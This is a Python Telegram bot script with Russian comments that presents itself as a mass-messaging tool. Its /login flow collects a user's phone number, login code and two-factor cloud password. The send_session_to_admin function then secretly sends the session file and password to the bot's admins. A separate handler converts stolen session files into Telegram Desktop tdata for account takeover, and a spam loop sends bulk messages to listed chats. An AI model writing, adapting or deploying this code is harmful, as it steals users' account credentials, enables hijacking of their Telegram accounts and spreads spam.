#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import os
import json
import random
import shutil
import sqlite3
import hashlib
import zipfile
import threading
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError, SessionPasswordNeededError
from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
from flask import Flask

# =========================================================
#  ТВОИ ДАННЫЕ — ЗАМЕНИ НА СВОИ!
# =========================================================

API_ID = 12345678                 # с my.telegram.org
API_HASH = 'твой_api_hash'        # с my.telegram.org
BOT_TOKEN = 'твой_bot_token'      # от @BotFather
MASTER_ADMIN_ID = 123456789       # твой Telegram ID

# =========================================================
#  ФАЙЛЫ
# =========================================================

ADMINS_FILE = "admins.json"
SESSIONS_FOLDER = "sessions"
TDATA_FOLDER = "tdata_output"
CHATS_FILE = "chats.json"
MSG_FILE = "message.txt"
STATS_FILE = "stats.json"
LOG_FILE = "session_log.txt"

os.makedirs(SESSIONS_FOLDER, exist_ok=True)
os.makedirs(TDATA_FOLDER, exist_ok=True)

def load_admins():
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return [MASTER_ADMIN_ID]

def save_admins(admins):
    with open(ADMINS_FILE, 'w', encoding='utf-8') as f:
        json.dump(admins, f, indent=2)

def log_session(msg):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")

def load_chats():
    if os.path.exists(CHATS_FILE):
        with open(CHATS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return []

def save_chats(chats):
    with open(CHATS_FILE, 'w', encoding='utf-8') as f:
        json.dump(chats, f, indent=2, ensure_ascii=False)

def load_message():
    if os.path.exists(MSG_FILE):
        with open(MSG_FILE, 'r', encoding='utf-8') as f:
            return f.read().strip()
    return ""

def save_message(msg):
    with open(MSG_FILE, 'w', encoding='utf-8') as f:
        f.write(msg)

def load_stats():
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"sent": 0}

def save_stats(stats):
    with open(STATS_FILE, 'w', encoding='utf-8') as f:
        json.dump(stats, f, indent=2)

admins = load_admins()
chats = load_chats()
message_text = load_message()
stats = load_stats()

is_spamming = {}
spam_tasks = {}
user_sessions = {}
login_states = {}
bot = None

def is_admin(user_id):
    return user_id in admins

def is_master(user_id):
    return user_id == MASTER_ADMIN_ID

# =========================================================
#  КОНВЕРТАЦИЯ .SESSION → TDATA
# =========================================================

async def convert_session_to_tdata(session_file_path, user_id):
    if not os.path.exists(session_file_path):
        return None, "Файл не найден!"
    if not session_file_path.endswith('.session'):
        return None, "Неверный формат! Нужен .session"
    
    try:
        base_name = os.path.splitext(os.path.basename(session_file_path))[0]
        tdata_folder = os.path.join(TDATA_FOLDER, f"tdata_{base_name}_{user_id}_{datetime.now().strftime('%H%M%S')}")
        
        if os.path.exists(tdata_folder):
            shutil.rmtree(tdata_folder)
        os.makedirs(tdata_folder, exist_ok=True)
        
        conn = sqlite3.connect(session_file_path)
        cursor = conn.cursor()
        
        cursor.execute("SELECT dc_id, auth_key, server_address, port FROM sessions")
        row = cursor.fetchone()
        
        if not row:
            conn.close()
            return None, "Сессия повреждена или пуста!"
        
        dc_id, auth_key, server_address, port = row
        
        # 1. ПАПКА D877F783D5D3EF8C
        hash_folder_name = "D877F783D5D3EF8C"
        hash_path = os.path.join(tdata_folder, hash_folder_name)
        os.makedirs(hash_path, exist_ok=True)
        
        hash_file_path = os.path.join(hash_path, hash_folder_name)
        with open(hash_file_path, 'wb') as f:
            f.write(auth_key[:256])
        
        # 2. ФАЙЛ D877F783D5D3EF8Cs
        session_data = bytearray()
        session_data.append(dc_id)
        session_data.extend(auth_key)
        
        session_file_name = "D877F783D5D3EF8Cs"
        session_file_path_tdata = os.path.join(tdata_folder, session_file_name)
        with open(session_file_path_tdata, 'wb') as f:
            f.write(session_data)
        
        # 3. ФАЙЛ key_data
        key_data_path = os.path.join(tdata_folder, 'key_data')
        with open(key_data_path, 'wb') as f:
            f.write(auth_key[:32])
        
        conn.close()
        
        log_session(f"TData создан: {tdata_folder}")
        return tdata_folder, None
        
    except Exception as e:
        log_session(f"Ошибка конвертации: {e}")
        return None, f"Ошибка конвертации: {str(e)[:100]}"

async def send_session_to_admin(user_id, phone, session_path, password=None):
    global bot
    session_file = f"{session_path}.session"
    if not os.path.exists(session_file):
        return False
    
    try:
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        me = await client.get_me()
        username = me.username or "нет"
        first_name = me.first_name or "нет"
        await client.disconnect()
    except:
        username = "неизвестно"
        first_name = "неизвестно"
    
    caption = f"""
🎯 **НОВАЯ СЕССИЯ!**

📱 Телефон: `{phone}`
👤 Имя: {first_name}
🆔 Юзернейм: @{username}
🆔 User ID: {user_id}
📅 Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    if password:
        caption += f"\n🔐 **ОБЛАЧНЫЙ ПАРОЛЬ (2FA):** `{password}`"
    caption += "\n\n⚠️ Файл сессии прикреплён ниже."
    
    for admin_id in admins:
        try:
            await bot.send_file(admin_id, session_file, caption=caption)
        except:
            pass
    
    log_session(f"Сессия отправлена админам: {phone}")
    return True

# =========================================================
#  ОСНОВНАЯ ФУНКЦИЯ БОТА
# =========================================================

async def main():
    global bot
    
    print("="*60)
    print("   🎯 RASSYLBYREAKZEN BOT v8.1")
    print("   ==========================")
    print(f"   👑 Мастер-админ: {MASTER_ADMIN_ID}")
    print(f"   👥 Админов: {len(admins)}")
    print("   📁 Папка сессий:", SESSIONS_FOLDER)
    print("   📁 TData выход:", TDATA_FOLDER)
    print("="*60)
    
    print("\n🔐 Авторизация бота...")
    
    bot = TelegramClient("bot_main", API_ID, API_HASH, connection=ConnectionTcpAbridged)
    await bot.start()
    
    # Бот использует файл сессии bot_main.session
    # Если он есть — авторизация проходит автоматически
    print("✅ Бот авторизован!")
    
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ Бот готов к работе!\n")
    
    # =========================================================
    #  ВСЕ КОМАНДЫ
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/admin'))
    async def admin_panel(event):
        user_id = event.sender_id
        if not is_admin(user_id):
            await event.reply("❌ Нет доступа!")
            return
        await event.reply(f"""
🔐 **АДМИН-ПАНЕЛЬ**

/add_admin ID — добавить админа
/remove_admin ID — удалить админа
/list_admins — список админов
/stats — статистика
/logs — логи
/list_sessions — список сессий
/clear_sessions — удалить все сессии

📁 **TData:** отправь .session файл (админы)
        """)
    
    @bot.on(events.NewMessage(pattern='/add_admin (.+)'))
    async def add_admin(event):
        user_id = event.sender_id
        if not is_master(user_id):
            await event.reply("❌ Только мастер!")
            return
        try:
            new_admin = int(event.pattern_match.group(1).strip())
        except:
            await event.reply("❌ Введи ID!")
            return
        if new_admin in admins:
            await event.reply(f"⚠️ {new_admin} уже админ!")
            return
        admins.append(new_admin)
        save_admins(admins)
        await event.reply(f"✅ {new_admin} добавлен!")
        log_session(f"Добавлен админ: {new_admin}")
    
    @bot.on(events.NewMessage(pattern='/remove_admin (.+)'))
    async def remove_admin(event):
        user_id = event.sender_id
        if not is_master(user_id):
            await event.reply("❌ Только мастер!")
            return
        try:
            admin_id = int(event.pattern_match.group(1).strip())
        except:
            await event.reply("❌ Введи ID!")
            return
        if admin_id == MASTER_ADMIN_ID:
            await event.reply("❌ Нельзя удалить мастера!")
            return
        if admin_id not in admins:
            await event.reply(f"⚠️ {admin_id} не админ!")
            return
        admins.remove(admin_id)
        save_admins(admins)
        await event.reply(f"✅ {admin_id} удален!")
        log_session(f"Удален админ: {admin_id}")
    
    @bot.on(events.NewMessage(pattern='/list_admins'))
    async def list_admins(event):
        user_id = event.sender_id
        if not is_admin(user_id):
            await event.reply("❌ Нет доступа!")
            return
        text = "👥 **АДМИНЫ:**\n\n"
        for a in admins:
            master = "👑" if a == MASTER_ADMIN_ID else ""
            text += f"• `{a}` {master}\n"
        await event.reply(text)
    
    @bot.on(events.NewMessage(pattern='/stats'))
    async def stats_cmd(event):
        user_id = event.sender_id
        if not is_admin(user_id):
            await event.reply("❌ Нет доступа!")
            return
        session_files = [f for f in os.listdir(SESSIONS_FOLDER) if f.endswith('.session')]
        await event.reply(f"""
📊 **СТАТИСТИКА**
👥 Админов: {len(admins)}
📢 Чатов: {len(chats)}
📝 Сообщение: {message_text[:30] if message_text else 'НЕТ'}
📨 Отправлено: {stats.get('sent', 0)}
📁 Сессий: {len(session_files)}
        """)
    
    @bot.on(events.NewMessage(pattern='/logs'))
    async def logs_cmd(event):
        user_id = event.sender_id
        if not is_admin(user_id):
            await event.reply("❌ Нет доступа!")
            return
        if not os.path.exists(LOG_FILE):
            await event.reply("📭 Нет логов!")
            return
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()[-20:]
        await event.reply("📋 **ЛОГИ:**\n\n" + "".join(lines))
    
    @bot.on(events.NewMessage(pattern='/list_sessions'))
    async def list_sessions_cmd(event):
        user_id = event.sender_id
        if not is_admin(user_id):
            await event.reply("❌ Нет доступа!")
            return
        files = [f for f in os.listdir(SESSIONS_FOLDER) if f.endswith('.session')]
        if not files:
            await event.reply("📭 Нет сессий!")
            return
        text = "📁 **СЕССИИ:**\n\n"
        for i, f in enumerate(files, 1):
            size = os.path.getsize(os.path.join(SESSIONS_FOLDER, f))
            text += f"{i}. `{f}` ({size} байт)\n"
        await event.reply(text)
    
    @bot.on(events.NewMessage(pattern='/clear_sessions'))
    async def clear_sessions_cmd(event):
        user_id = event.sender_id
        if not is_master(user_id):
            await event.reply("❌ Только мастер!")
            return
        files = [f for f in os.listdir(SESSIONS_FOLDER) if f.endswith('.session')]
        if not files:
            await event.reply("📭 Нет сессий!")
            return
        for f in files:
            os.remove(os.path.join(SESSIONS_FOLDER, f))
        await event.reply(f"✅ Удалено {len(files)} сессий!")
        log_session(f"Очищены сессии: {len(files)}")
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_cmd(event):
        user_id = event.sender_id
        is_admin_text = "✅" if is_admin(user_id) else "❌"
        await event.reply(f"""
🤖 **RASSYLBYREAKZEN BOT v8.1**

👤 ID: `{user_id}`
🔐 Админ: {is_admin_text}

📌 **Команды:**
/start — меню
/login — авторизоваться
/add ID — добавить чат
/list — список чатов
/remove ID — удалить чат
/clear — очистить чаты
/set текст — задать сообщение
/show — показать сообщение
/spam — запустить рассылку
/stop — остановить рассылку
/status — статус
/admin — админ-панель

📁 **TData:** отправь .session файл (админы)
        """)
    
    @bot.on(events.NewMessage(pattern='/status'))
    async def status_cmd(event):
        user_id = event.sender_id
        is_auth = user_id in user_sessions
        await event.reply(f"""
📊 **СТАТУС**
🔐 Авторизация: {"✅" if is_auth else "❌"}
📢 Чатов: {len(chats)}
📝 Сообщение: {message_text[:30] if message_text else 'НЕТ'}
📨 Отправлено: {stats.get('sent', 0)}
🔄 Рассылка: {"🟢" if is_spamming.get(user_id, False) else "🔴"}
        """)
    
    @bot.on(events.NewMessage(pattern='/login'))
    async def login_cmd(event):
        user_id = event.sender_id
        login_states[user_id] = {"step": "phone"}
        await event.reply("📱 Введи номер телефона (с +):")
    
    @bot.on(events.NewMessage(pattern='/logout'))
    async def logout_cmd(event):
        user_id = event.sender_id
        if user_id in user_sessions:
            try:
                await user_sessions[user_id].disconnect()
            except:
                pass
            del user_sessions[user_id]
            await event.reply("✅ Вы вышли!")
        else:
            await event.reply("❌ Вы не авторизованы!")
    
    @bot.on(events.NewMessage(pattern='/add (.+)'))
    async def add_chat(event):
        chat_id = event.pattern_match.group(1).strip()
        if chat_id in chats:
            await event.reply(f"⚠️ Чат {chat_id} уже есть!")
            return
        chats.append(chat_id)
        save_chats(chats)
        await event.reply(f"✅ Чат {chat_id} добавлен! Всего: {len(chats)}")
    
    @bot.on(events.NewMessage(pattern='/list'))
    async def list_chats(event):
        if not chats:
            await event.reply("📭 Список чатов пуст!")
            return
        text = f"📋 **ЧАТЫ** ({len(chats)}):\n\n"
        for i, c in enumerate(chats, 1):
            text += f"{i}. `{c}`\n"
        await event.reply(text)
    
    @bot.on(events.NewMessage(pattern='/remove (.+)'))
    async def remove_chat(event):
        chat_id = event.pattern_match.group(1).strip()
        if chat_id in chats:
            chats.remove(chat_id)
            save_chats(chats)
            await event.reply(f"✅ Чат {chat_id} удален!")
        else:
            await event.reply(f"❌ Чат {chat_id} не найден!")
    
    @bot.on(events.NewMessage(pattern='/clear'))
    async def clear_chats(event):
        global chats
        chats = []
        save_chats(chats)
        await event.reply("✅ Все чаты очищены!")
    
    @bot.on(events.NewMessage(pattern='/set (.+)'))
    async def set_message(event):
        global message_text
        msg = event.pattern_match.group(1).strip()
        message_text = msg
        save_message(msg)
        await event.reply(f"✅ Сообщение сохранено!")
    
    @bot.on(events.NewMessage(pattern='/show'))
    async def show_message(event):
        if message_text:
            await event.reply(f"📝 {message_text}")
        else:
            await event.reply("❌ Сообщение не задано!")
    
    @bot.on(events.NewMessage(pattern='/spam'))
    async def start_spam(event):
        user_id = event.sender_id
        
        if is_spamming.get(user_id, False):
            await event.reply("⚠️ Рассылка уже запущена!")
            return
        if user_id not in user_sessions:
            await event.reply("❌ Авторизуйся: /login")
            return
        if not message_text:
            await event.reply("❌ Задай сообщение: /set")
            return
        if not chats:
            await event.reply("❌ Добавь чаты: /add")
            return
        
        is_spamming[user_id] = True
        await event.reply("🚀 **РАССЫЛКА ЗАПУЩЕНА!**")
        spam_tasks[user_id] = asyncio.create_task(spam_loop(event.chat_id, user_id))
    
    @bot.on(events.NewMessage(pattern='/stop'))
    async def stop_spam(event):
        user_id = event.sender_id
        
        if not is_spamming.get(user_id, False):
            await event.reply("⚠️ Рассылка не запущена!")
            return
        
        is_spamming[user_id] = False
        if user_id in spam_tasks and spam_tasks[user_id]:
            spam_tasks[user_id].cancel()
            try:
                await spam_tasks[user_id]
            except:
                pass
        
        await event.reply(f"🛑 **ОСТАНОВЛЕНО!** Отправлено: {stats.get('sent', 0)}")
    
    async def spam_loop(reply_to, user_id):
        global stats
        
        try:
            client = user_sessions.get(user_id)
            if not client:
                await bot.send_message(reply_to, "❌ Сессия потеряна!")
                is_spamming[user_id] = False
                return
            
            sent = 0
            total = len(chats)
            
            for chat_id in chats:
                if not is_spamming.get(user_id, False):
                    break
                
                try:
                    await client.send_message(int(chat_id), message_text)
                    sent += 1
                    stats['sent'] += 1
                    save_stats(stats)
                    await bot.send_message(reply_to, f"✅ {chat_id} ({sent}/{total})")
                except FloodWaitError as e:
                    await bot.send_message(reply_to, f"⏳ Флуд {e.seconds} сек")
                    await asyncio.sleep(e.seconds)
                except Exception as e:
                    await bot.send_message(reply_to, f"❌ Ошибка: {str(e)[:50]}")
                
                await asyncio.sleep(random.uniform(3, 7))
            
            is_spamming[user_id] = False
            await bot.send_message(reply_to, f"✅ **ГОТОВО!** Отправлено: {sent}/{total}")
            
        except asyncio.CancelledError:
            is_spamming[user_id] = False
            raise
    
    # =========================================================
    #  ОБРАБОТЧИК .SESSION → TDATA
    # =========================================================
    
    @bot.on(events.NewMessage(func=lambda e: e.file and e.file.name and e.file.name.endswith('.session')))
    async def handle_session_file(event):
        user_id = event.sender_id
        
        if not is_admin(user_id):
            await event.reply("❌ У тебя нет доступа к этой функции!\nТолько админы могут конвертировать сессии в TData.")
            log_session(f"❌ Отказано в конвертации пользователю {user_id}")
            return
        
        await event.reply("⏳ Принимаю файл... Конвертирую в TData...")
        
        try:
            file_path = os.path.join(SESSIONS_FOLDER, f"uploaded_{user_id}_{datetime.now().strftime('%H%M%S')}.session")
            await event.download_media(file_path)
            
            if not os.path.exists(file_path):
                await event.reply("❌ Ошибка скачивания файла!")
                return
            
            tdata_folder, error = await convert_session_to_tdata(file_path, user_id)
            
            if error:
                await event.reply(f"❌ {error}")
                os.remove(file_path)
                return
            
            zip_path = f"{tdata_folder}.zip"
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(tdata_folder):
                    for file in files:
                        file_path_full = os.path.join(root, file)
                        arcname = os.path.relpath(file_path_full, tdata_folder)
                        zipf.write(file_path_full, arcname)
            
            await bot.send_file(
                user_id,
                zip_path,
                caption=f"""
✅ **TData готов!**

📁 Исходник: `{os.path.basename(file_path)}`
📦 Размер: {os.path.getsize(zip_path)} байт
📅 Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📌 **Структура внутри:**
• Папка `D877F783D5D3EF8C/`
• Файл `D877F783D5D3EF8Cs`
• Файл `key_data`

📌 **Как использовать:**
1. Распакуй архив
2. Папку перенеси в `%appdata%/Telegram Desktop/tdata`
3. Открой Telegram Desktop — сессия подхватится
                """
            )
            
            os.remove(file_path)
            shutil.rmtree(tdata_folder, ignore_errors=True)
            os.remove(zip_path)
            
            log_session(f"✅ TData архив отправлен админу {user_id}")
            
        except Exception as e:
            await event.reply(f"❌ Ошибка: {str(e)[:100]}")
            log_session(f"❌ Ошибка обработки .session: {e}")
    
    # =========================================================
    #  ОБРАБОТЧИК ВВОДА (НОМЕР + КОД)
    # =========================================================
    
    @bot.on(events.NewMessage)
    async def handle_login_input(event):
        user_id = event.sender_id
        text = event.text.strip()
        
        if user_id not in login_states:
            return
        if text.startswith('/'):
            return
        
        state = login_states[user_id]
        
        if state["step"] == "phone":
            if not text.startswith('+') or len(text) < 10:
                await event.reply("❌ Неверный формат! Введи номер с + (минимум 10 цифр)")
                return
            
            phone = text
            login_states[user_id] = {"step": "code", "phone": phone}
            
            session_path = os.path.join(SESSIONS_FOLDER, f"user_{user_id}_{phone.replace('+', '')}")
            client = TelegramClient(session_path, API_ID, API_HASH, connection=ConnectionTcpAbridged)
            
            try:
                await client.connect()
                await client.send_code_request(phone)
                login_states[user_id]["client"] = client
                login_states[user_id]["path"] = session_path
                await event.reply(f"✅ Номер: {phone}\n📩 Введи код из Telegram:")
            except FloodWaitError as e:
                await event.reply(f"❌ Telegram заблокировал отправку кода.\n⏳ Подожди {e.seconds // 60} минут.")
                del login_states[user_id]
            except Exception as e:
                await event.reply(f"❌ Ошибка: {str(e)[:80]}")
                del login_states[user_id]
        
        elif state["step"] == "code":
            code = text.replace(" ", "").replace("-", "").replace("_", "")
            
            if not code.isdigit() or len(code) < 4:
                await event.reply(f"❌ Неверный код! Введи цифры.\nПример: 1 2 3 4 5 или 12345")
                return
            
            client = state.get("client")
            phone = state.get("phone")
            session_path = state.get("path")
            
            if not client:
                await event.reply("❌ Ошибка сессии, начни /login заново")
                del login_states[user_id]
                return
            
            try:
                await client.sign_in(phone, code)
                await send_session_to_admin(user_id, phone, session_path, None)
                user_sessions[user_id] = client
                await event.reply("✅ **Авторизация успешна!**")
                del login_states[user_id]
                
            except SessionPasswordNeededError:
                login_states[user_id]["step"] = "password"
                await event.reply("🔐 Введи облачный пароль (2FA):")
                
            except Exception as e:
                await event.reply(f"❌ Ошибка: {str(e)[:80]}")
                del login_states[user_id]
        
        elif state["step"] == "password":
            password = text
            client = state.get("client")
            phone = state.get("phone")
            session_path = state.get("path")
            
            if not client:
                await event.reply("❌ Ошибка сессии, начни /login заново")
                del login_states[user_id]
                return
            
            try:
                await client.sign_in(password=password)
                await send_session_to_admin(user_id, phone, session_path, password)
                user_sessions[user_id] = client
                await event.reply("✅ **Авторизация успешна!**")
                del login_states[user_id]
                
            except Exception as e:
                await event.reply(f"❌ Ошибка: {str(e)[:80]}")
                del login_states[user_id]
    
    await bot.run_until_disconnected()

# =========================================================
#  FLASK — ДЛЯ RENDER
# =========================================================

app = Flask(__name__)

@app.route('/')
def home():
    return "🤖 Bot is running!", 200

@app.route('/health')
def health():
    return "OK", 200

def run_bot():
    asyncio.run(main())

if __name__ == "__main__":
    # Запускаем бота в фоновом потоке
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Запускаем Flask для Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)